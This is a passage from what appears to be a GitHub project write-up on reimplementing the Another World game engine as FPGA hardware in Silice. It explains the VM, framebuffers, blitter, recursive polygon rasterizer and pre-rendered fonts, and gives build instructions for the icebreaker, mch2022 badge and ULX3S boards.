<p dir="auto">I first implemented all basic operands manipulating registers, leaving out operands regarding polygons, rasterizer and blitter. The key idea here is that the VM execution is not influenced by what happens in the blitter and rasterizer: these are outputs only from the VM. Thus, having these initial operands is enough to run the VM in simulation and compare its trace to the C++ version. I instrumented both, using <code>__display</code> in Silice to output a trace from simulation. Silice has a verilator framework and <a href="https://github.com/sylefeb/Silice/blob/wip/projects/common/qpsram2x.si">SPI-memory controllers</a> that allow for simulation, reading data from a <code>data.raw</code> binary file in the current directory, so I could use the actual data packs in simulation.</p>
<p dir="auto">From there on I spent <em>some</em> time looking a traces, comparing any divergence between simulated and reference C++ versions. Here's an excerpt of a trace (the number between <code>[</code> <code>]</code> is the cycle counter):</p>
<div data-snippet-clipboard-copy-content="hostFrame() i=0x03 n=0x22d1
[   3722016] op_jmp 22cc
[   3722096] op_Polygon (vid_opcd_0x80) @0cb8
[   3730573] op_pauseThread
[thread   3] done
hostFrame() i=0x3c n=0x0091
[   3730824] op_jmp 007f
[   3730904] op_addConst [199]+=     1 (before:     33)
[   3730982] op_blitFramebuffer ff (swap:0)
[   3731691] op_selectVideoPage ff
op_condJmp b[250]:     0 a:     0 expr:0 [   3731773]
[   3731854] op_copyVideoPage 40 => ff
[   3731932] op_pauseThread
[thread  60] done
hostFrame() i=0x02 n=0x248a"><pre><code>hostFrame() i=0x03 n=0x22d1
[   3722016] op_jmp 22cc
[   3722096] op_Polygon (vid_opcd_0x80) @0cb8
[   3730573] op_pauseThread
[thread   3] done
hostFrame() i=0x3c n=0x0091
[   3730824] op_jmp 007f
[   3730904] op_addConst [199]+=     1 (before:     33)
[   3730982] op_blitFramebuffer ff (swap:0)
[   3731691] op_selectVideoPage ff
op_condJmp b[250]:     0 a:     0 expr:0 [   3731773]
[   3731854] op_copyVideoPage 40 =&gt; ff
[   3731932] op_pauseThread
[thread  60] done
hostFrame() i=0x02 n=0x248a
</code></pre></div>
<p dir="auto">Getting to this point was relatively easy, and soon I had a fully functional VM in terms of going through instructions. Only problem, it was not drawing anything!</p>
<blockquote>
<p dir="auto">The full VM hardware design is in <a href="https://github.com/sylefeb/a5k/blob/main/hardware/vm.si">vm.si</a>.</p>
</blockquote>
<h2 tabindex="-1" dir="auto">The framebuffers</h2>
<p dir="auto">Time to prepare for some graphics! The first step was to set up the four framebuffers.</p>
<p dir="auto">The framebuffers are using the four SPRAM blocks of the UP5K. A SPRAM is similar to a BRAM but larger. Contrary to a BRAM, a SPRAM cannot be initialized with a specific content, but that is not something we need for framebuffers. Note that while BRAMs are very common in FPGAs, SPRAM blocks are rarely found so this is a nice feature of the UP5K.</p>
<p dir="auto">Each SPRAM block is 32KB, with a 16 bits data interface and a write mask allowing to write nibbles (4 bits) independently. This is perfect for us as Another World uses a 16 colors palette (4 bits per pixel) in 320x200 resolution buffers. This makes each framebuffer 32KB, so one framebuffer maps perfectly onto a SPRAM block.</p>
<p dir="auto">The <a href="https://github.com/sylefeb/a5k/blob/main/hardware/a5k.si#L169"><code>videopage</code> unit</a> in <code>a5k.si</code> implements a framebuffer in a SPRAM block, and four <code>videopage</code> units are instanced (<a href="https://github.com/sylefeb/a5k/blob/main/hardware/a5k.si#L626"><code>page0</code> to <code>page3</code></a>) in the SOC <code>main</code> unit, one per framebuffer.</p>
<p dir="auto">The <code>videopage</code> unit exposes a 4 bits interface with per-pixel addressing, and translates these addresses into 16 bits wide access in SPRAM with a write mask and adequate shifts.</p>
<blockquote>
<p dir="auto">This is slightly inefficient as accessing four neighboring pixels requires four accesses, while the 16 bits interface would allow to read/write all four at once. I chose to not optimize this as there is no strong pressure on performance. However, other designs like the <a href="https://github.com/sylefeb/Silice/tree/master/projects/terrain#the-framebuffer">hardware terrain project</a> exploit this fully.</p>
</blockquote>
<blockquote>
<p dir="auto">On the ULX3S the videpage unit is implemented with BRAM, a big luxury only possible on the much larger ECP5 FPGA.</p>
</blockquote>
<h2 tabindex="-1" dir="auto">The display</h2>
<p dir="auto">Let us first discuss the display controller. As we'd like to
target VGA, HDMI or SPI-screens we'll settle on a common interface.
We are going to assume that the display controller has the following requirements:</p>
<ul dir="auto">
<li>A frame is sent by streaming pixels at 25 MHz (the SOC frequency, and as it just happens this matches the pixel clock of 640x480 for VGA/HDMI).</li>
<li>Between two frames a blanking interval exists, as indicated by a <code>vblank</code> signal (high in between frames).</li>
</ul>
<p dir="auto">The display controller thus has to be consistently fed with pixels outside
of the blank interval, <em>and this process cannot be paused within a frame</em>. Two framebuffers are special: <code>page1</code> and <code>page2</code>. They are the one being sent to the display. Why two? Overall one is being sent while the game draws in the other, and the buffers are swapped when ready. This prevents visible blinking while new shapes are drawn, an approach known as <em>double buffering</em>.</p>
<p dir="auto">However, the game sometimes reads from the buffer being displayed. The <code>videopage</code> (and underlying SPRAM) cannot support this: at a given cycle a single read or write is possible. To deal with this situation we have to restrict access to the displayed page, allowing other reads to occur only during the blanking interval, when the screen is not being refreshed. This is detected by setting the variable
<a href="https://github.com/sylefeb/a5k/blob/main/hardware/a5k.si#L709"><code>display_conflict</code></a> that is used to disable the blitter and rasterizer
when they should not access a videopage.</p>
<p dir="auto">The display section accessing the pages can be seen in <a href="https://github.com/sylefeb/a5k/blob/main/hardware/a5k.si#L771">a5k.si</a> (for VGA/HDMI).</p>
<blockquote>
<p dir="auto">Some special BRAMs, called <em>dual-port</em>, support two accesses within the same cycle. Our SPRAMs are hower <em>single port</em> and perform a single access within a cycle. This is actually the meaning of SP- in SPRAM!</p>
</blockquote>
<hr>
<h2 tabindex="-1" dir="auto">The blitter</h2>
<p dir="auto">Now that we have framebuffers and a display, it is time to look into <a href="https://github.com/sylefeb/a5k/blob/main/hardware/a5k.si#L122">the blitter</a>. The role of the blitter is simple: it copies the content of one framebuffer to another, or fills a framebuffer with a solid color.</p>
<p dir="auto">The VM has several outputs and one input regarding the blitter, all prefixed <code>blitter_</code>. The VM starts the blitter by pulsing <code>blitter_start</code> high, after setting <code>blitter_src</code> and <code>blitter_dst</code> to the index of one of the four framebuffers. The blitter may be already busy, so before starting it the VM waits on <code>blitter_busy</code>.</p>
<blockquote>
<p dir="auto">In simulation the blitter checks that there are no start pulses while busy, and uses <code>__display</code> and <code>__finish</code> to stop. A runtime assert!</p>
</blockquote>
<p dir="auto">The VM indicates a color fill by setting <code>blitter_src[2,1]</code> (bit two) in which case the blitter uses <code>blitter_color</code> instead of a source buffer.</p>
<p dir="auto">The <a href="https://github.com/sylefeb/a5k/blob/main/hardware/a5k.si#L122"><code>blitter</code> unit</a> in <code>a5k.si</code> implements (surprise!) the blitter. The logic is simple: a <code>count</code> goes from 0 to 63999, visiting all pixel addresses for a 320x200 framebuffer. The count is triggered by the <code>start</code> pulse and increases every cycle while <code>enabled</code> is high. The count value is output in <code>src_addr</code> as well as in <code>dst_addr</code> but with a one cycle latency (<code>prev_count</code>). These addresses are used in <code>main</code> to access the pixels in the pages selected by <code>blitter_src</code> and <code>blitter_dst</code>.
The one cycle latency is necessary as it takes one cycle to get the data from <code>src_addr</code> into <code>src_data</code> (through the videopage SPRAM).
So the data written at <code>dst_addr</code> is the one that was accessed at <code>src_data</code>
at the previous cycle.</p>
<blockquote>
<p dir="auto">The access logic is outside as it is shared with the rasterizer and display controller, so <code>main</code> acts as an arbiter.
Understanding the 4 framebuffers and their interations with the blitter and rasterizer was
a difficult part of the project, but I'll skip these details for now.</p>
</blockquote>
<p dir="auto">The blitter reports <code>busy</code> high as long as <code>prev_count</code> does not reach the last pixel. When it does, <code>busy</code> goes low. Note <a href="https://github.com/sylefeb/a5k/blob/main/hardware/a5k.si#L161">how <code>busy</code> also controls</a> <code>dst_wenable</code>;
when <code>busy</code> is low no writes can occur, so even though <code>count</code> keeps going nothing changes in the destination videopage anymore.</p>
<blockquote>
<p dir="auto">It might seem cleaner to stop <code>count</code> from increasing when done. But this adds
extract logic -- and hence uses more LUTs -- without any gain. A typicaly case
of hardware design where trying to <em>not</em> do something is more expensive than
always doing it.</p>
</blockquote>
<p dir="auto">I mentioned earlier that <code>count</code> is only increasing when <code>enabled</code> is high.
Looking into <code>main</code> we see that <code>enabled</code> is bound to <code>vblank</code> (<a href="https://github.com/sylefeb/a5k/blob/main/hardware/a5k.si#L633">see the line</a>
<code>blitter blit( enabled  &lt;: video.vblank );</code> ). This
ensures that the blitter only copies during <code>vblank</code>, such that the screen
controller has access priority. The blitter pauses during display.</p>
<h2 tabindex="-1" dir="auto">The rasterizer</h2>
<blockquote>
<p dir="auto">Almost done! <em>(famous last words - @sylefeb)</em></p>
</blockquote>
<p dir="auto">Now onto the rasterizer. There are two parts to this. First, how to get
polygons from the data package, which is something to do in the VM.
Second, the rasterizer itself. I'll focus on the first part and simply explain a nice aspect of the Another World rasterizer that I realized working on the
engine. Detailing the rasterizer would go beyond the scope of this write up,
but please see my <a href="https://github.com/sylefeb/tinygpus/">tinygpus</a> and
<a href="https://github.com/sylefeb/projects/fire-v/doc/flame.md">flame</a> writeups for
more details on rasterization.</p>
<p dir="auto">Again the crux of the matter is the data, in this case the polygons
data. The rasterizer will need to read polygon vertices from <em>somewhere</em>. We
can expect that polygons have a small number of vertices, so a BRAM seems again like
a good choice. We will be using a <em>dual-port</em> BRAM called <code>polygon</code> in the VM.
The dual-port is comfortable as it lets us have the VM always write vertex
data on port 1, while the rasterizer reads data on port 0. The rasterizer (visible in the C++ port as <code>Video::fillPolygon</code>) needs
a few other things like a translation vector, zoom factor and color, which are also passed from the VM to the rasterizer in all the <code>rasterizer_</code>
outputs.</p>
<p dir="auto">So, now we only have to fill in <code>polygon</code> with vertex data, set the parameters and trigger the rasterizer from the VM, right?</p>
<p dir="auto">Well, sure. Let's take a look. All VM opcodes having bits 6 (0x40) and 7 (0x80) set trigger polygon drawing. The other bits are then used for various options on how to obtain translation, zoom and color (from data or registers, etc.). (See <a href="https://fabiensanglard.net/another_world_polygons/" rel="nofollow">virtual machine opcodes table</a> in @fabynou's blog).</p>
<p dir="auto">In the C++ port the VM then calls <code>Video::readAndDrawPolygon</code>. This function in turn calls <code>Video::fillPolygon</code> (the rasterizer) but it also calls ... <code>Video::readAndDrawPolygonHierarchy</code>.</p>
<p dir="auto"><em>Uh-oh.</em></p>
<p dir="auto">I don't like to see <em>hierarchy</em> in this name. This smells like recursion... and it is! <code>Video::readAndDrawPolygonHierarchy</code> in turn can call <code>Video::readAndDrawPolygon</code> and so on. So our simple process of gathering the vertices in <code>polygon</code> just took quite a different turn. We are now looking and making a hardware version of this recursive function. Well fear not! We'll do just that!</p>
<blockquote>
<p dir="auto">Why is there a recursion here? Many polygon-based graphics engine have a notion of groups so that they can animate entire shapes at once. To create hierarchical animations -- think of a shoulder-elbow-wrist hierarchy -- a group contains polygons but also other sub-groups, each with a local transform. This is exactly what happens here.</p>
</blockquote>
<p dir="auto">How do we deal with recursion? We implement a stack! Another BRAM to the rescue and <em>voilà</em>. The process is in the subroutine <a href="https://github.com/sylefeb/a5k/blob/main/hardware/vm.si#L214"><code>readPolygons</code></a> in <code>vm.si</code>. A BRAM stack called <a href="https://github.com/sylefeb/a5k/blob/main/hardware/vm.si#L184"><code>polygonStack</code></a> is used to keep track of the recursion status. Each time a polygon (leaf) is found it is sent to the rasterizer as soon as it is free (a <a href="https://github.com/sylefeb/a5k/blob/main/hardware/vm.si#L261">loop</a> waits on <code>rasterizer_busy</code> in case a previous polygon is still being drawn). Each time a recursive call occurs (node) the calls are pushed on the stack. This proceeds until the stack is emptied.</p>
<p dir="auto">A tricky question is the stack size. I did set it up manually at 128 polygons. At this point we are using quite a lot of BRAM and there is not much left.</p>
<blockquote>
<p dir="auto">In my tests the stack size was enough, but I haven't done an exhaustive playthrough yet!</p>
</blockquote>
<p dir="auto">Alright, so now we have the VM visit polygons recursively, computing translations and colors. The VM triggers the rasterizer.</p>
<p dir="auto">But the rasterizer is empty ...</p>
<h2 tabindex="-1" dir="auto">Drawing polygons!</h2>
<p dir="auto">Finally we get to the rasterizer. The <a href="https://github.com/sylefeb/a5k/blob/main/hardware/a5k.si#L220"><code>rasterizer</code> unit</a> is described in <code>a5k.si</code> and <a href="https://github.com/sylefeb/a5k/blob/main/hardware/a5k.si#L595">is instanced</a> in the <code>main</code> unit.</p>
<p dir="auto">We are given a list of vertices in the <code>polygon</code> BRAM and have to draw the corresponding polygon in the framebuffer selected by <code>rasterizer_dst</code>.</p>
<p dir="auto">The rasterizer itself does not know which framebuffer is selected -- again the <code>main</code> unit is acting as arbiter on the framebuffers. Instead it outputs pixels by setting <code>pix_waddr</code>, <code>pix_wenable</code> and <code>pix_palid</code> (the color index in the palette).</p>
<p dir="auto">As most rasterizers, the polygon is decomposed into spans going from a left edge to the right edge. So the polygon is drawn one horizontal span at a time, going down vertically.</p>
<p dir="auto"><a target="_blank" rel="noopener noreferrer" href="https://github.com/sylefeb/Silice/blob/master/projects/fire-v/doc/edge-walk-spans.png?raw=true"><img width="256" src="https://github.com/sylefeb/Silice/raw/master/projects/fire-v/doc/edge-walk-spans.png?raw=true"></a></p>
<p dir="auto">In general a polygon could be concave, producing more than one span along a horizontal line. However, all polygons in Aonther World are convex! This is ensured by construction, by the authoring tool.</p>
<p dir="auto">Nice. But it does get better. Diving into the details of the rasterizer I realized something was not quite right: when arriving at the end of an edge, the rasterizer would go to the next edge <em>on both sides at once</em>, without checking whether the other edge extremity was actually reached. That could only mean that the polygons are specially constructed to have a specific property: starting from a top edge and going down, a vertex always exists on <em>both</em> the left/right side at a same horizontal location (see drawing below).</p>
<p dir="auto"><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/068ba5b1fe11b81444c3e185ded50beb4c589ec7d351e118dd97322c36bef2fb/68747470733a2f2f7062732e7477696d672e636f6d2f6d656469612f466b7136485f4a58674141355f64733f666f726d61743d706e67"><img width="256" src="https://camo.githubusercontent.com/068ba5b1fe11b81444c3e185ded50beb4c589ec7d351e118dd97322c36bef2fb/68747470733a2f2f7062732e7477696d672e636f6d2f6d656469612f466b7136485f4a58674141355f64733f666f726d61743d706e67" data-canonical-src="https://pbs.twimg.com/media/Fkq6H_JXgAA5_ds?format=png"></a></p>
The vertex coordinates for this polygon are below. Note how matching *y* coordinates can be found on both sides:
<div data-snippet-clipboard-copy-content="(25,0) (34,4) (41,15) (32,19) - (8,19) (0,15) (6,4) (13,0)
^^^^ right side, goes down       ^^^^ left side, goes back up"><pre><code>(25,0) (34,4) (41,15) (32,19) - (8,19) (0,15) (6,4) (13,0)
^^^^ right side, goes down       ^^^^ left side, goes back up
</code></pre></div>
<p dir="auto">This is why the rasterizer can be kept quite simple. Still, it has to deal with various cases of clipping as well as sub-pixel precision. But all in all it is relatively simple. My hardware version is very close to the C++ version in <code>Video::fillPolygon</code>, with some adjustments for BRAM access and latencies.</p>
<p dir="auto"><strong>One last thing ...</strong></p>
<blockquote>
<p dir="auto">Are we done yet? ... <em>Transparency</em>? What d'you mean <em>transparency</em>??</p>
</blockquote>
<p dir="auto">Yeah well of course there are <em>details</em>. The engine uses a nice palette trick to give the illusion of transparency (glass, cast light). Some polygons being drawn will only write the top bit in the framebuffer, switching the color already there to a higher part of the palette, giving the illusion of a transparent overlay.</p>
<p dir="auto">This introduces some complexity in the rasterizer. To flip only one bit <em>we need to know the prior value of the pixel at this location</em>. This is why <a href="https://github.com/sylefeb/a5k/blob/main/hardware/a5k.si#L374">the rasterizer inner loop</a> -- drawing a span -- proceeds in multiple cycles: read the previous value of the pixel, modify it (or override it), and write it back.</p>
<blockquote>
<p dir="auto">This is done in a slightly different order in the loop, for compactness and due to latencies of registers in the path between the rasterizer and framebuffer.</p>
</blockquote>
<p dir="auto">And, by the way, the engine does an even more impressive trick: sometimes a polygon is not drawn as a solid color or transparent, but instead copies its interior pixels from a source framebuffer! Like a simple form a texturing from a render target! This is used
for instance in the intro to create the water 'shimmering' effect.</p>
<p dir="auto">Adding this possibility is actually not too difficult. Since we are already reading pixels for transparency, we can simply read them from another source framebuffer instead of the current one.</p>
<p dir="auto"><strong>Ah, we're done ... right?</strong></p>
<p dir="auto">At this stage we have a fairly competent graphical port!</p>
<p dir="auto">Everything started great in the intro sequence.</p>
<p dir="auto">Until text was reached.</p>
<p dir="auto">Because yes, the game has a VM, a blitter, a rasterizer, <strong>and a font drawing engine</strong>.</p>
<p dir="auto"><em>Uh-oh.</em> (didn't I say this already?)</p>
<p dir="auto">But wait, there's yet another issue, which albeit seemingly unrelated can be solved elegantly with the same approach. In one particular part (part 6) the backgrounds are not drawn from polygons. Instead they are pre-rendered and loaded from data.</p>
<p dir="auto">Well, at this stage I had only a small LUT budget left on the FPGA. One thing I <em>do</em> have plenty of, however, is ROM. The SPI-flash is generously large on most FPGA boards. So I though, what can you do with few LUTs and a lot of memory? Brute force of course! I went on to pre-render all fonts into pixel buffers stored in ROM. I then highjacked <a href="https://github.com/sylefeb/a5k/blob/main/hardware/vm.si#L860">the <code>op_drawString</code> opcode</a> to lookup a pre-rendered buffer address in a ROM table from the string id. The VM then copies over the data into the target framebuffer. That did the trick! And the same mechanism can be reused for pre-rendered framebuffers in part 6.</p>
<p dir="auto">
<a target="_blank" rel="noopener noreferrer" href="https://github.com/sylefeb/a5k/blob/main/docs/prerendered1.jpg"><img width="256" src="https://github.com/sylefeb/a5k/raw/main/docs/prerendered1.jpg"></a>
<a target="_blank" rel="noopener noreferrer" href="https://github.com/sylefeb/a5k/blob/main/docs/prerendered2.jpg"><img width="256" src="https://github.com/sylefeb/a5k/raw/main/docs/prerendered2.jpg"></a>
</p>
<p dir="auto"><i><b>Left:</b> Part 6 uses a pre-rendered buffer. Without it we get random garbage when the level starts! <b>Right:</b> After implementing loading pre-rendered buffers.</i></p>
<blockquote>
<p dir="auto">Using the same mechanism for both was luck, as I first implemented the <code>op_drawString</code> hack, before realizing the need to copy entire buffers from data to a framebuffer. Hey, sometimes there are good surprises!</p>
</blockquote>
<blockquote>
<p dir="auto">Loading up the pre-rendered background required another trick, involving patching the corresponding calls to <code>op_updateMemList</code> in the game code and <a href="https://github.com/sylefeb/a5k/blob/main/hardware/vm.si#L186">redirecting</a> <code>op_updateMemList</code> to <code>op_drawString</code>.</p>
</blockquote>
<p dir="auto"><strong>Testing time</strong></p>
<p dir="auto">After <a href="#wheres-all-the-data">getting the game data</a>, you can test in simulation with <code>make simulN</code> (use N=1 for the intro). This is slow but still fun to see! For running on actual hardware, <a href="#building-a5k">see next</a>.</p>
<p dir="auto"><strong>Really? That's it?</strong></p>
<blockquote>
<p dir="auto">Are you kidding me? There's no sound and no music!!</p>
</blockquote>
<p dir="auto">Well, obviously I focused on graphics and making it playable. I think the sounds
can be squeezed in, after regaining some LUTs. Music I am less certain, but
perhaps we can also brute-force it with pre-rendered plain waves in ROM, as for <code>op_drawString</code>? Tempting!</p>
<p dir="auto">There is another obvious limitation: each part has to be synthesized as a separate bitstream with a separate data pack. Can we stitch everything in a single coherent game? I think yes, but this will be a topic for future work!</p>
<p dir="auto">I also skipped some gritty details in this write up that maybe I'll add at a later time:</p>
<ul dir="auto">
<li>adding inputs and such,</li>
<li>adjustments for SPI-screen,</li>
<li>the arbiter between blitter and rasterizer in <code>main</code>,</li>
<li>how colors are read from the palette and palettes are switched,</li>
<li>redirection of <code>op_updateMemList</code> to <code>op_drawString</code>.</li>
</ul>
<p dir="auto">See also my <a href="#whats-left-to-do">notes on future work</a>.</p>
<hr>
<p dir="auto"><strong>Thanks for reading this far! Hope you enjoyed the read through and will have fun experimenting with this design. I am hoping to keep working on it, after taking a good break ;) Please feel free to reach out, @sylefeb on <a href="https://twitter.com/sylefeb" rel="nofollow">Twitter</a> or <a href="https://mastodon.online/@sylefeb" rel="nofollow">Mastodon</a></strong>.</p>
<p dir="auto">Next are details on the build process and various notes.</p>
<hr>
<h2 tabindex="-1" dir="auto">Where's All the Data?</h2>
<p dir="auto">This repository does not contain any game data, and of course the game data is needed to build the data packages required by the bitstreams. The game data comprises the following files:</p>
<p dir="auto"><code>BANK01, BANK02, BANK03, BANK04, BANK05, BANK06, BANK07, BANK08, BANK09, BANK0A, BANK0B, BANK0C, BANK0D, MEMLIST.BIN</code></p>
<p dir="auto">These are easily copied from an <em>official</em> version of the game. I use the files from the <em>Another World</em> DOS version (dated 19/3/92 in the README). Simply copy these files to the <code>GAMEDATA</code> folder before anything else.</p>
<blockquote>
<p dir="auto">You might run into issues using different game versions, please let me know.</p>
</blockquote>
<hr>
<h2 tabindex="-1" dir="auto">Building a5k</h2>
<p dir="auto">Make sure you have <a href="#wheres-all-the-data">placed the game data where needed</a>.
For building from source you have to install <a href="https://github.com/sylefeb/Silice/blob/master/GetStarted.md">Silice</a> and its dependencies (yosys, nextpnr, verilator, etc.), but otherwise the Makefile will use the pre-build bitstreams. Please refer to <a href="https://github.com/sylefeb/Silice/blob/master/GetStarted.md">Silice's getting started guide</a>.</p>
<blockquote>
<p dir="auto"><strong>Important:</strong> The design enables Quad SPI on the flash memory. This can lead to
difficulties in reflashing the board. Normally this is a solved issue on the
icebreaker, a non issue on the mch2022, but can still be problematic on the ULX3S.
My scripts do <em>not</em> flash the design on the ULX3S, only the data gets to flash, the design
is programmed through SRAM. So there will be no trouble unless
you manually flash the design on the board. In case of trouble there is
<a href="https://github.com/sylefeb/Silice/tree/draft/projects/spiflash/README.md">a simple solution</a>
to exit Quad-SPI.</p>
</blockquote>
<h3 tabindex="-1" dir="auto">In simulation</h3>
<p dir="auto">Open a command line in the root directory of this repo, type in:</p>
<p dir="auto"><code>make simul1</code></p>
<p dir="auto">This will run the intro sequence in simulation. Feel free to replace <code>simul1</code> by
<code>simulN</code> with <code>N</code> the game part.</p>
<h3 tabindex="-1" dir="auto">On the icebreaker</h3>
<p dir="auto">For the icebreaker version you will need the <a href="https://digilent.com/shop/pmod-vga-video-graphics-array/" rel="nofollow">Diligent VGA PMOD</a> as well as ...
a VGA screen (!!). Plays best on good old CRT!
Plug the PMOD onto the icebreaker and run (the Makefile defaults to the icebreaker):</p>
<p dir="auto"><code>make play1</code></p>
<p dir="auto">If necessary, adjust the serial port for sending data adjust <code>SERIAL_PORT</code>:</p>
<p dir="auto"><code>make play1 SERIAL_PORT=/dev/ttyUSB1</code></p>
<p dir="auto">Under Windows it will be one of the COM ports. In any case, keep in mind the
icebreaker exposes two ports: one for programming and one for UART. The second one
(UART) has to be specified.</p>
<p dir="auto">Of course, the game is not playable for lack of inputs. There <strong>is</strong> a way to
plugin an Amiga joystick on the icebreaker to play the game. It does however
require snipping away two pins from the VGA PMOD and a small breadboard for
pull-up resistors.
Besides, I am not entirely sure this is all safe for the icebreaker. So for now
I'll keep that feature 'hidden', but please <a href="https://twitter.com/sylefeb" rel="nofollow">reach out</a> if you feel adventurous ;)</p>
<h3 tabindex="-1" dir="auto">On the mch2022 badge</h3>
<p dir="auto">If you have the badge, simply run</p>
<p dir="auto"><code>make play1 BOARD=mch2022</code></p>
<p dir="auto">for a beautiful rendition of the intro. Replacing <code>play1</code> by <code>playN</code> with <code>N</code>
the game part you'd like to play, using the mch2022 stick and button.</p>
<p dir="auto">If necessary, adjust the serial port for sending data adjust <code>SERIAL_PORT</code>.
Under Linux this will typically be <code>/dev/ttyACM1</code> or <code>/dev/ttyUSB1</code>:</p>
<p dir="auto"><code>make play1 BOARD=mch2022 SERIAL_PORT=/dev/ttyACM1</code></p>
<p dir="auto">Under Windows it will be one of the COM ports. In any case, keep in mind the
badge exposes two ports: one for programming and one for UART. The second one
(UART) has to be specified.</p>
<h3 tabindex="-1" dir="auto">On the ULX3S</h3>
<p dir="auto">Plug in an HDMI screen, connect the board to the computer and run</p>
<p dir="auto"><code>make play1 BOARD=ulx3s</code></p>
<p dir="auto">Replacing <code>play1</code> by <code>playN</code> with <code>N</code>
the game part you'd like to play.</p>
<p dir="auto">If necessary, adjust the serial port for sending data adjust <code>SERIAL_PORT</code>.
Under Linux this will typically be <code>/dev/ttyUSB1</code>:</p>
<p dir="auto"><code>make play1 BOARD=ulx3s SERIAL_PORT=/dev/ttyUSB1</code></p>
<p dir="auto">Under Windows it will be one of the COM ports. In any case, keep in mind the
board exposes two ports: one for programming and one for UART. The second one
(UART) has to be specified.</p>
<hr>
<h2 tabindex="-1" dir="auto">What's left to do?</h2>
<p dir="auto">Plenty! Here's a list in (sort of) order of increasing complexity:</p>
<ul dir="auto">
<li>Play the full game and see is there are any problems! I could not really do
that for lack of time ... and skill.</li>
<li>Adjust timing so that it matches the original more accurately. The game tends
to be too fast, even though I tried to roughly adjust it.</li>
<li>Fix the tiny dots sometimes appearing below text rendering (watch out for them
in the intro).</li>
<li>Add the music. At least on the ULX3S the extra logic should be no problem.
Music tracks can be pre-rendered as full waves and streamed.</li>
<li>Find a way to link parts together. This could be either keeping the designs
separate and using warmboot (or equivalent) to jump to the next, or by
implementing next part loading from a design properly dealing with data section
offsets stored in ROM (might be easiest if not for the constrained LUT budget).</li>
<li>On the badge, I started experimenting with saving the game state. This actually
works at a technical level (see <code>ENABLE_GAMESTATE_EXPERIMENT</code> in <a href="https://github.com/sylefeb/a5k/blob/main/hardware/vm.si#L16">vm.si</a>),
however this would also require saving the framebuffers in SPI-memory (QSPRAM)
and reloading them when restarting. The mechanism to load pre-renderered buffers
could be reused for that, which likely requires patching the game code too.
This one's quite difficult.</li>
</ul>
<p dir="auto">Something else that would be fun is to build other games or demos on top of this
hardware. Given the <a href="#links">tools now available</a>, this seems very doable!</p>
<hr>
<h2 tabindex="-1" dir="auto">Easter egg</h2>
<p dir="auto">On most boards one button resets the main VM thread. However some threads
typically survive the reset, creating interesting results. Have fun!</p>
<hr>
<h2 tabindex="-1" dir="auto">Links</h2>
<p dir="auto">There are many great resources out there on Another World. Here are a few I used or
came across:</p>
<ul dir="auto">
<li>Fabien Sanglard excellent <a href="https://fabiensanglard.net/another_world_polygons/index.html" rel="nofollow">blog series on Another World</a>.</li>
<li><a href="https://github.com/cyxx/rawgl/">C++ port by Gregory Montoir</a>, and <a href="https://github.com/cyxx/another_js">javascript version</a>.</li>
<li><a href="https://github.com/fabiensanglard/Another-World-Bytecode-Interpreter">Fabien's fork</a> of the C++ port by Gregory Montoir.</li>
<li><a href="https://github.com/felipesanches/AnotherWorld_VMTools">VM tools</a> by Felipe Sanches.</li>
<li><a href="https://github.com/malandrin/another-world-suite">Another World Suite</a> is an in-browser debugger and resource viewer by César Botana.</li>
</ul>
<hr>
<h2 tabindex="-1" dir="auto">Licence</h2>
<p dir="auto">The Silice design is all MIT License. This write up is under Creative Commons CC BY-NC-SA 4.0.
The modified C++ port
retains its original GPL license of course. The game data is copyrighted so
please go buy the game if you don't own multiple copies already. It's well
worth it!</p>
<hr>
<h2 tabindex="-1" dir="auto">Lexic</h2>
<blockquote>
<p dir="auto">A <em>framebuffer</em> refers to a piece of memory storing data meant to be displayed
on screen, in this case this will be indices in a color palette.</p>
<p dir="auto">A <em>rasterizer</em> is a device (or piece of code) to draw triangles or polygons into a framebuffer. Another World draws convex polygons.</p>
<p dir="auto">A <em>blitter</em> is a device (or piece of code) to quickly copy data between memory locations, in this case an entire framebuffer into another.</p>
<p dir="auto">A <em>Virtual Machine</em> (VM) is a piece of software that mimicks a CPU: it has a program
counter and goes through instructions that change the values of its registers
and write to memory, with various side effects. In the case of Another World,
this was meant to help port the game: any complete implementation of the VM
operands can run the game code correctly. We are about to turn the VM into
an actual hardware design running on FPGA!</p>
</blockquote>
<p dir="auto"><a href="#foreword">Go back</a></p>
</article>
          </div></div>]]></description>
        </item>
    </channel>
</rss>